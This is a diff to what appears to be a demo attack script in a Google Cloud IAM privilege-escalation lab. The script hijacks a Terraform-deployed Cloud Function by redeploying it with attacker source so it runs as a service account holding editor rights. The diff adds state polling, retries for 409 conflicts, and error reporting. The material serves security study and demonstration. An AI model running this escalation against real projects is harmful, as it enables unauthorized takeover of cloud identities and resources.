@@ -5,7 +5,7 @@
 # Attack: starting_sa holds cloudfunctions.functions.update +
 # cloudfunctions.functions.sourceCodeSet + run.routes.invoke at the project
 # level (via a minimal custom role), AND iam.serviceAccounts.actAs on
-# target_sa (via roles/iam.serviceAccountUser).
+# target_sa (via a minimal actAs custom role granting only that permission).
 #
 # The victim function is already deployed by Terraform, running AS target_sa
 # (roles/editor), with a benign hello-world handler. The attacker replaces
@@ -254,22 +254,67 @@ if $USE_GCLOUD; then
     # gcloud mode — --build-service-account skips Cloud Build GetDefaultServiceAccount
     # and project IAM validation, reducing gcloud-mechanic permissions from 7 to 2.
     show_attack_cmd "$STARTING_SA_EMAIL" \
-        "gcloud functions deploy $VICTIM_FUNCTION_NAME --gen2 --runtime=python312 --region=$REGION --source=$BUILD_DIR/src --entry-point=$ENTRY_POINT --trigger-http --no-allow-unauthenticated --service-account=$TARGET_SA_EMAIL --build-service-account=projects/${PROJECT_ID}/serviceAccounts/${TARGET_SA_EMAIL} --impersonate-service-account=$STARTING_SA_EMAIL"
+        "gcloud functions deploy $VICTIM_FUNCTION_NAME --gen2 --runtime=python312 --region=$REGION --source=$BUILD_DIR/src --entry-point=$ENTRY_POINT --trigger-http --service-account=$TARGET_SA_EMAIL --build-service-account=projects/${PROJECT_ID}/serviceAccounts/${TARGET_SA_EMAIL} --impersonate-service-account=$STARTING_SA_EMAIL"
 
-    if ! gcloud functions deploy "$VICTIM_FUNCTION_NAME" \
-            --gen2 \
-            --runtime=python312 \
-            --region="$REGION" \
-            --source="$BUILD_DIR/src" \
-            --entry-point="$ENTRY_POINT" \
-            --trigger-http \
-            --no-allow-unauthenticated \
-            --service-account="$TARGET_SA_EMAIL" \
-            --build-service-account="projects/${PROJECT_ID}/serviceAccounts/${TARGET_SA_EMAIL}" \
+    # Cloud Functions v2 rejects deploys with 409 "unable to queue the operation"
+    # while another operation on the same function is still finalizing (e.g. a
+    # demo or cleanup deploy from minutes ago — gen2 ops take ~2-4 min). Poll
+    # the function state until it is ACTIVE before deploying.
+    for i in $(seq 1 30); do
+        CF_STATE=$(gcloud functions describe "$VICTIM_FUNCTION_NAME" \
+            --gen2 --region="$REGION" \
             --impersonate-service-account="$STARTING_SA_EMAIL" \
-            --quiet 2>/dev/null; then
+            --format='value(state)' 2>/dev/null || echo "UNKNOWN")
+        [ "$CF_STATE" = "ACTIVE" ] && break
+        if [ "$i" -eq 1 ]; then
+            echo -e "${DIM}Function state: $CF_STATE — waiting for in-flight operation to finish (up to 5 min)${NC}"
+        fi
+        sleep 10
+    done
+
+    # NOTE: --no-allow-unauthenticated is deliberately NOT passed. On an
+    # update, that flag forces gcloud to verify the Cloud Run invoker policy
+    # (run.services.getIamPolicy) after the deploy — a permission starting_sa
+    # does not hold, so gcloud exits 1 even though the deploy succeeded.
+    # Omitting the flag leaves the existing invoker policy untouched (the
+    # victim function was deployed restricted by Terraform and stays that way),
+    # keeping the gcloud-mechanic set to just functions.get + projects.get.
+    DEPLOY_ERR="$BUILD_DIR/deploy_stderr.log"
+    DEPLOY_OK=false
+    for attempt in 1 2 3; do
+        if gcloud functions deploy "$VICTIM_FUNCTION_NAME" \
+                --gen2 \
+                --runtime=python312 \
+                --region="$REGION" \
+                --source="$BUILD_DIR/src" \
+                --entry-point="$ENTRY_POINT" \
+                --trigger-http \
+                --service-account="$TARGET_SA_EMAIL" \
+                --build-service-account="projects/${PROJECT_ID}/serviceAccounts/${TARGET_SA_EMAIL}" \
+                --impersonate-service-account="$STARTING_SA_EMAIL" \
+                --quiet 2>"$DEPLOY_ERR"; then
+            DEPLOY_OK=true
+            break
+        fi
+        # Retry on concurrent-operation conflicts: the PATCH is rejected with
+        # 409 "unable to queue the operation" if an op raced in between our
+        # ACTIVE pre-check and this deploy.
+        if grep -q "unable to queue the operation" "$DEPLOY_ERR" && [ "$attempt" -lt 3 ]; then
+            echo -e "${YELLOW}409: another operation in flight — retrying in 30s (attempt $attempt/3)${NC}"
+            sleep 30
+        else
+            break
+        fi
+    done
+
+    if ! $DEPLOY_OK; then
         echo -e "${RED}✗ gcloud functions deploy failed${NC}"
-        echo "Check that starting_sa holds cloudfunctions.functions.update, sourceCodeSet,"
+        echo ""
+        echo "Actual gcloud error:"
+        sed 's/^/    /' "$DEPLOY_ERR"
+        echo ""
+        echo "If this is a PERMISSION_DENIED error, check that starting_sa holds:"
+        echo "cloudfunctions.functions.update, sourceCodeSet,"
         echo "operations.get, run.routes.invoke, actAs on target_sa, functions.get,"
         echo "and resourcemanager.projects.get"
         echo ""
@@ -515,7 +560,7 @@ if $USE_GCLOUD; then
     echo "    cloudfunctions.functions.get — gcloud GetFunction preflight before every deploy"
     echo "    resourcemanager.projects.get — unconditional project GET on every gcloud command"
     echo ""
-    echo "  These are included in starting_sa's gcloud-mechanic role by Terraform."
+    echo "  These are included in starting_sa's helpful role by Terraform."
     echo "  To see the attack with only the true minimum permissions (no gcloud overhead):"
     echo -e "  ${CYAN}\$ ./demo_attack.sh --api-only${NC}"
 fi
